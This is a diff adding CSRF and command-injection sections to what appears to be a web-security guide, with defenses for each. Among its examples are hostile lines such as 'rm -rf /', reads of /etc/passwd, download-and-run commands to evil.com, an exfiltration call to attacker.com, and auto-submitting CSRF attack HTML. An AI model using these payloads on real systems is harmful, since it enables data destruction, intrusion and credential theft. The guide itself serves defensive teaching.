@@ -5270,6 +5270,576 @@ Once that happens:
 
 Authentication and authorization controls are meaningless.
 
+---
+
+# 🔥 1️⃣1️⃣ Cross-Site Request Forgery (CSRF)
+
+> **CSRF tricks a victim’s browser into performing unintended authenticated actions.**
+
+---
+
+## 🧠 Core Principle
+
+> **CSRF abuses the fact that browsers automatically attach credentials to requests.**
+
+The browser:
+
+* Automatically sends cookies
+* Automatically sends session tokens
+* Automatically includes authentication headers (for same-origin requests)
+
+It does not ask:
+
+> “Did the user intend this request?”
+
+If attacker can cause the browser to send a request:
+
+And the user is authenticated:
+
+The server executes it.
+
+---
+
+## 🔍 What CSRF Really Is
+
+CSRF is:
+
+> **A confused deputy attack via the browser.**
+
+The browser is the deputy.
+
+The attacker tricks it into performing actions on behalf of the victim.
+
+---
+
+## 🎯 Attack Model
+
+Requirements for CSRF:
+
+1. Victim is logged in.
+2. Authentication relies on cookies or implicit credentials.
+3. Sensitive action does not require additional verification.
+4. No CSRF protection in place.
+
+---
+
+## 🔥 Classic CSRF Example
+
+Victim is logged into:
+
+```
+bank.com
+```
+
+Attacker hosts malicious page:
+
+```html
+<img src="https://bank.com/transfer?to=attacker&amount=1000">
+```
+
+Victim visits malicious site.
+
+Browser automatically sends:
+
+```
+GET /transfer?to=attacker&amount=1000
+Cookie: session=abc123
+```
+
+Bank processes transfer.
+
+Victim never clicked transfer button.
+
+---
+
+## 🧠 Why This Works
+
+Because:
+
+> **Browsers automatically attach cookies to same-site requests — regardless of origin of request.**
+
+The browser sees:
+
+* Domain matches
+* Cookie applies
+* Send it
+
+It does not verify user intent.
+
+---
+
+## 🔥 POST-Based CSRF
+
+Attacker page:
+
+```html
+<form action="https://bank.com/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker">
+  <input type="hidden" name="amount" value="1000">
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+```
+
+Victim loads page.
+
+Auto-submit triggers.
+
+Authenticated POST sent.
+
+---
+
+## 🔥 Modern CSRF (2026 Context)
+
+Even APIs are vulnerable if:
+
+* They rely on cookies
+* No CSRF token required
+* CORS misconfigured
+
+Example:
+
+Single Page App uses:
+
+```
+Authorization: Bearer token
+```
+
+If token stored in cookie:
+
+Still vulnerable.
+
+If token stored in localStorage and API requires explicit header:
+
+Less vulnerable.
+
+---
+
+## 🔥 JSON CSRF
+
+Many developers think:
+
+> “Our API only accepts JSON — so CSRF is impossible.”
+
+Wrong.
+
+Attackers can craft:
+
+```
+Content-Type: text/plain
+```
+
+And bypass naive CSRF defenses.
+
+Or exploit CORS misconfigurations.
+
+---
+
+## 🔥 Impact of CSRF
+
+CSRF can:
+
+* Transfer funds
+* Change password
+* Change email
+* Enable MFA reset
+* Add admin user
+* Delete account
+* Trigger data export
+
+If sensitive action does not verify intent:
+
+It is vulnerable.
+
+---
+
+## 🛡️ Defense Mechanisms (Deep Dive)
+
+---
+
+### 🔐 1️⃣ CSRF Tokens (Primary Defense)
+
+> **Every state-changing request must include an unpredictable token.**
+
+Flow:
+
+1. Server generates random CSRF token.
+2. Token embedded in form or API.
+3. Token validated on submission.
+4. Token bound to session.
+
+If attacker cannot read page (due to same-origin policy):
+
+They cannot know token.
+
+Thus cannot forge valid request.
+
+---
+
+### 🔥 Double Submit Cookie Pattern
+
+* CSRF token stored in cookie.
+* Also sent in header.
+* Server verifies match.
+
+Prevents cross-site request abuse.
+
+---
+
+### 🔐 2️⃣ SameSite Cookies
+
+Modern browsers support:
+
+```
+SameSite=Strict
+SameSite=Lax
+```
+
+SameSite prevents cookies from being sent in cross-site requests.
+
+Strict:
+
+* Cookies only sent in first-party context.
+
+Lax:
+
+* Sent for top-level GET navigation.
+
+Prevents most CSRF attacks automatically.
+
+But:
+
+> SameSite alone is not sufficient for high-risk operations.
+
+---
+
+### 🔐 3️⃣ Re-authentication for Sensitive Actions
+
+For critical operations:
+
+* Password change
+* Email change
+* Wire transfer
+* MFA reset
+
+Require:
+
+* Password re-entry
+* OTP confirmation
+* WebAuthn confirmation
+
+This adds:
+
+> **Intent verification layer.**
+
+---
+
+### 🔐 4️⃣ Idempotent GET Requests
+
+Never allow:
+
+* State changes via GET.
+
+GET must be:
+
+> Safe and idempotent.
+
+If GET modifies state:
+
+You are inviting CSRF.
+
+---
+
+### 🧠 The Deep Insight About CSRF
+
+CSRF exploits:
+
+> **Implicit authentication.**
+
+If authentication relies solely on:
+
+* Automatically sent cookies
+
+Then:
+
+CSRF risk exists.
+
+Modern solution trend:
+
+* Move to explicit Authorization headers
+* Use SameSite cookies
+* Combine CSRF tokens
+* Add step-up authentication
+
+---
+
+# 🔥 1️⃣2️⃣ Command Injection
+
+> **Command injection occurs when user input is interpreted as executable shell syntax, leading to OS-level compromise.**
+---
+
+## 🧠 Core Principle
+
+> **Command injection occurs when user input is interpreted as part of a system shell command.**
+
+This is OS-level injection.
+
+More dangerous than SQL injection.
+
+Because it can lead to:
+
+* Remote Code Execution (RCE)
+* Full server compromise
+* Lateral movement
+
+---
+
+## 🔍 What Is Happening Under the Hood?
+
+Application code does:
+
+```python
+os.system("ping " + user_input)
+```
+
+If user_input:
+
+```
+8.8.8.8
+```
+
+Command:
+
+```
+ping 8.8.8.8
+```
+
+Safe.
+
+If user_input:
+
+```
+8.8.8.8; rm -rf /
+```
+
+Command becomes:
+
+```
+ping 8.8.8.8; rm -rf /
+```
+
+Shell interprets `;` as command separator.
+
+Now attacker executes arbitrary commands.
+
+---
+
+## 🔥 Why This Is Catastrophic
+
+Because shell can:
+
+* Read files
+* Delete files
+* Download malware
+* Create reverse shells
+* Access internal network
+* Dump credentials
+
+Command injection often leads to:
+
+> **Full server takeover.**
+
+---
+
+## 🔥 Advanced Command Injection Examples
+
+---
+
+### 🔹 1️⃣ Pipe Injection
+
+```
+user_input = "8.8.8.8 | cat /etc/passwd"
+```
+
+---
+
+### 🔹 2️⃣ Backtick Injection
+
+```
+user_input = "`whoami`"
+```
+
+---
+
+### 🔹 3️⃣ Subshell Injection
+
+```
+$(curl evil.com/shell.sh | sh)
+```
+
+---
+
+## 🔹 4️⃣ Windows Injection
+
+```
+& dir
+```
+
+Different shell syntax.
+
+---
+
+## 🔥 Blind Command Injection
+
+No output returned.
+
+Attacker uses:
+
+```
+; sleep 5
+```
+
+If response delayed:
+
+Injection confirmed.
+
+Or:
+
+```
+; curl attacker.com/exfil?data=$(cat /etc/passwd)
+```
+
+Exfiltrates data externally.
+
+---
+
+## 🔥 Real-World Breach Pattern
+
+1. Web app includes image processing.
+2. Uses shell command:
+
+   ```
+   convert input.jpg output.png
+   ```
+3. User uploads file named:
+
+   ```
+   input.jpg; curl evil.com/payload.sh | sh
+   ```
+4. Server executes injected command.
+5. Attacker gains shell.
+
+---
+
+## 🛡️ Mitigation Strategies (Deep Dive)
+
+---
+
+### 🔐 1️⃣ Avoid Shell Completely (Best Defense)
+
+Use:
+
+* Language-native APIs
+* Libraries
+* Direct system calls without shell
+* Parameterized execution
+
+Example in Python:
+
+Instead of:
+
+```python
+os.system("ping " + user_input)
+```
+
+Use:
+
+```python
+subprocess.run(["ping", user_input])
+```
+
+This avoids shell interpretation.
+
+---
+
+### 🔐 2️⃣ Use Safe APIs
+
+If you must call system command:
+
+* Use execve-style APIs
+* Avoid passing entire command string
+* Separate arguments explicitly
+
+---
+
+### 🔐 3️⃣ Strict Whitelisting
+
+If input must be:
+
+* IP address
+* Filename
+* Domain
+
+Validate strictly:
+
+* Regex validation
+* Length limit
+* Character allowlist
+
+Reject:
+
+* `;`
+* `|`
+* `&`
+* `$`
+* `(`
+* `)`
+
+But remember:
+
+> Validation is secondary defense. Avoid shell when possible.
+
+---
+
+### 🔐 4️⃣ Least Privilege
+
+Even if injection occurs:
+
+* Application user should not be root.
+* File system permissions restricted.
+* Network egress restricted.
+* Containers isolated.
+
+Defense in depth matters.
+
+---
+
+## 🔥 Modern 2026 Twist — Cloud Command Injection
+
+Injection can lead to:
+
+* Reading AWS metadata endpoint
+* Stealing IAM credentials
+* Accessing Kubernetes service account tokens
+* Accessing internal services
+
+One injection → cloud takeover.
+
+---
+
+## 🧠 Deep Insight
+
+Command injection is:
+
+> **Trusting user input in the most privileged interpreter on the system.**
+
+Shell is powerful.
+
+Do not expose it to user data.
+
+---
 
 # Quotes
 
